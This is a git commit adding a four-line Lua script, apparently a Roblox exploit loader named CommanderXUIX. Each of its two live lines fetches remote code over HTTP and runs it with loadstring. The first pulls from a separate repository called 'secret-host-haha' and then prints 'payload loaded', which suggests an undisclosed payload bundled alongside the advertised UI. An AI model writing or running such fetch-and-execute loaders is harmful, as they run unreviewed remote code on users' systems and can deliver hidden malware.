4c10494ecc1699780451f49774b19caca8f68585
anyahubs <131607266+anyahubs@users.noreply.github.com>
2024-01-25 13:57:24 +0300

    Create CommanderXUIX.lua

---
+++ CommanderXUIX.lua
@@ -0,0 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/delta-hydro/secret-host-haha/main/drawing_script.lua"))();
+wait(1)
+print("payload loaded I V2")
+loadstring(game:HttpGet('https://raw.githubusercontent.com/anyahubs/CommanderX/main/UI'))()
